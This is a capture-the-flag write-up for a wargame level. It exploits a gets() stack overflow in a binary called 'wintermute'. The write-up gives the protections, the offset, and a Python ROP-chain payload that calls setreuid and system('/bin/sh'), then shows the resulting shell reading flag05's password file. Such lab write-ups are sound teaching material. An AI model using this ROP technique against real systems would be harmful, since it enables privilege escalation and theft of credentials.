## Infos on the binary

```shell
level05@rainfall:~$ checksec wintermute
[*] '/home/level05/wintermute'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Same protections as levl03/04.

And as level03, there is an unprotected buffer overflow on a gets() call, in `run_query`
The buffer is set to 96 bytes, and the overflow happens after 120 bytes.

```shell
#define QUERY_SIZE 96

static void run_query(void)
{
    char query[QUERY_SIZE];
    unsigned int h;

    printf("[WINTERMUTE] Query: ");
    fflush(stdout);

    gets(query);
```

So it all loooks like level03 situation, so we tried to do the same ROP chain. We juste need to change the offset to 120 bytes, and the uid to flag05 :

## Solving

```shell
level05@rainfall:~$ cat /etc/passwd | grep flag05
flag05:x:1022:1024::/home/flag05:/usr/sbin/nologin
           |
          UID
```

```shell
level05@rainfall:~$ python3 -c '
import sys, struct
p64 = lambda x: struct.pack("<Q", x)

payload  = b"A" * 120
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(1022)             # uid de flag05
payload += p64(0x7ffff7d10b7d)   # pop rsi ; ret
payload += p64(1022)             # uid de flag05
payload += p64(0x7ffff7d27370)   # setreuid
payload += p64(0x7ffff7d0c08d)   # pop rdi ; ret
payload += p64(0x7ffff7dcc42f)   # "/bin/sh"
payload += p64(0x7ffff7c58750)   # system
sys.stdout.buffer.write(payload)' > /tmp/test
```

````shell
level05@rainfall:~$ (cat /tmp/test; cat) | ./wintermute 
  [WINTERMUTE] I am everywhere and nowhere.
  [WINTERMUTE] Neural query interface active.
[WINTERMUTE] Query: 
[WINTERMUTE] Hash: 0c7b0f07
[WINTERMUTE] Matrix[0][0]: 0c7b0f1d
[WINTERMUTE] Node N000 weight=3
[WINTERMUTE] Node N002 weight=17
[WINTERMUTE] Node N004 weight=31
whoami
flag05
cat /home/flag05/.pass
67aaawdq0zcaaf3x57yh6irhvyjv3vs5
```